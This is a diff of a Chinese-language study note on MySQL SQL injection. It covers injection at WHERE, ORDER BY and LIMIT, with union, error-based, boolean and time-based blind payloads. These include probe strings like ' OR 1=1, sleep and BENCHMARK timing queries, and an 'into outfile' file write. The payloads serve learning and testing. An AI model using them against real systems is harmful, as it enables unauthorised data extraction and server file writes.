@@ -87,16 +87,16 @@ where #1#
 [limit 0,4] 
 #[procedure analyse()]#;
 ```
-目前我认为来说主要注入点有3个，途中##标识的3个地方，分别`select`语句下是`where`处的注入、`order by`处的注入和`limit`处的注入。第3个从来没有碰到过...但是在p神的博客后看到，这个注入有点局限，高版本不能使用select子句查询了。
+目前我认为来说主要注入点有3个，途中##标识的3个地方，分别`select`语句下是`where`处的注入、`order by`处的注入和`limit`处的注入。第3个从来没有碰到过...但是在p神的博客后看到，这个注入有点局限，高版本不能使用select子句查询了。  
 
 ## 1号注入点
 where处的注入,最基本的到高级的是: union注入->报错注入->布尔注入->盲注
 
-**union注入**
+## union注入
 
-union注入的条件是有回显.
-注入方法是先用`order by`判断列,记得用注释符号注释掉语句后面的内容,因为可能原先的sql语句也存在order by.
-假如有3列
+union注入的条件是有回显.  
+注入方法是先用`order by`判断列,记得用注释符号注释掉语句后面的内容,因为可能原先的sql语句也存在order by.  
+假如有3列  
 
 - 注入语句为:
 ```sql
@@ -161,7 +161,7 @@ unino select group_concat(PARAM) from TABLE;
 union select 1,(select concat(`1`,0x3a,`2`) from (select 1,2 union select * from users)a limit 1,1);
 ```
 
-**报错注入**
+## 报错注入
 
 - floor,extractvalue,updatexml
 ```sql
@@ -206,22 +206,38 @@ select *  from(select * from TABLE a join TABLE b using(COLUMN,COLUMN.....))c;
 select * from user where ID=1 and Polygon(ID)
 ```
 
-**布尔注入和盲注**
+## 布尔注入和盲注
 
 两种注入方法的区别其实就是一个回显是01一个回显是时间长短.
 注入利用的主要是运算符号或和条件语句.
 `_`代表空格
 
-- 符号
+###  符号或语法
 ```sql
  - + * /(div) %(mod) 
  = <>(!=) > < <= >= between not_between in not_in <=> like regexp rlike is_null is_not_null
  not(!) and or xor & | ^ << >> ~
 ```
 
-- 语句有`if`,`case when then else end`
+**和匹配相关的语法**  
+参考：
+- https://dev.mysql.com/doc/refman/8.0/en/regexp.html#function_regexp-like
+```
+like,rlike,regexp,not_regexp等
+```
+  
+其中like的语法中`_`,`%`是通配符，可以匹配任何。但是`_`一旦超过匹配字符串的长度，就会匹配不到，`%`则没有数量限制。  
+简单如下：
+```sql
+select 'aaa' like '___'; # 1
+select 'aaa' like '____'; # 0
+select 'aaa' like '%%%%'; # 1
+select 'aaa' like '%%%%%'; #1
+```
 
-- 字符串截取函数
+
+### 常规函数
+**字符串截取函数**
 ```sql
 Mid(version(),1,1)
 Substr(version(),1,1)
@@ -232,29 +248,47 @@ Left(version(),1)
 reverse(right(reverse(version()),1)
 ```
 
-- 字符串连接函数
+**字符串连接函数**
 ```sql
 concat(version(),'|',user());
 concat_ws('|',1,2,3)
 group_concat(version(),'~')
 ```
 
-- 字符转换
+**字符转换**
 ```
 Char(49)
 Hex('a')
 Unhex(61)
 ```
 
-- 探测payload
-```sql
-' OR 1=1;-- -
+### 探测payload
 ```
+' OR 1=1;-- -
+' OR 1=1;#
+```
+
+### 回显语句
+```sql
+if(x,x,x)
+case when 条件1 then 结果1 else 结果2 end
+case 条件0 when 条件1 then 结果1 else 结果2 end
+and 判断语句 and sleep(5) # 如果判断语句错误就不会执行sleep(5)
+or 判断语句 or sleep(5) # 如果语句正确就不执行sleep(5)
+
+完整如下：
+select(if((ascii('a')='97'),1,2));
+select(case(ascii('a'))when(97)then(1)else(2)end);
+select 1 and ascii('a')>96 and sleep(1);
+select 0 or !ascii('a')>96 or sleep(1);  # 加一个!就会加快脚本的爆破速度。
+```
+
 
 ## 2号注入点
 2号注入点是`order by`后面的注入.
 其注入方式有点类似于盲注和布尔注入.
-- 注入语句有
+
+### 注入语句有
 ```sql
 if()
 case when then else end
@@ -263,9 +297,8 @@ rand
 (select 1 regexp if())
 updaetxml()
 extractvalue()
-```
-- 总结的几个语句
-```
+
+完整如下：
 select * from users order by 1 and If(ascii(substr(database(),1,1))=116,0,sleep(1));
 (SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)
 rand(ascii(left(database(),1))=116)
@@ -273,6 +306,8 @@ rand(ascii(left(database(),1))=116)
 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
 1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"
 ```
+
+
 ## 3号注入点
 limit后的注入
 参见p神的[博客](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
